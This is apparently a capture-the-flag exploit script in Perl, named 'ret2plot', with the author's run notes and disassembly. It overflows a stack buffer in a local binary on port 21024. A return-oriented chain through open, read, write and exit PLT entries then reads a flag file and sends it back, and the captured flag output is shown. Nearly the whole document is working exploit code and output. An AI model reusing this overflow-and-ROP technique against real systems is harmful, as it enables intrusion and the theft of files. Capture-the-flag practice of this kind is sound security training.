# ret2plot
use lib qw (/opt/ctf/tools/ctf-tools/pwn/perl_pwntools);
use pwntools;
use Time::HiRes qw (usleep);
$flag_str = 0x08048740;
#$pwntools::ARCH = '64';
&connect(\$s, 'localhost', 21024) or die "ng";
$buf = "A" x (300+int($ARGV[0]));
$buf.= p(0x8048440).p(0x80486ce).p($flag_str).p(0); # open
$buf.= p(0x80483e0).p(0x80486cd).p(3).p(0x0804a800).p(0x100); # read
$buf.= p(0x8048460).p(0x80486cd).p(1).p(0x0804a800).p(0x100); # write
$buf.= p(0x8048430).p(0x41414141).p(0)."\n"; # exit
syswrite($s, $buf, length($buf));
usleep(200000);
sysread($s, $data, 0x100); print $data;
#&interact($s);
__END__
$ perl try1.pl 19
FLAG_GGGGGGGGGGGGG
$ objdump -d -Mintel bof
$ rodata2od bof
$ view bof.disas
080483e0 <read@plt>:
08048440 <open@plt>:
08048460 <write@plt>:
08048430 <exit@plt>:
 80486cc:       5b                      pop    ebx
 80486cd:       5e                      pop    esi
 80486ce:       5f                      pop    edi
 80486cf:       5d                      pop    ebp
 80486d0:       c3                      ret
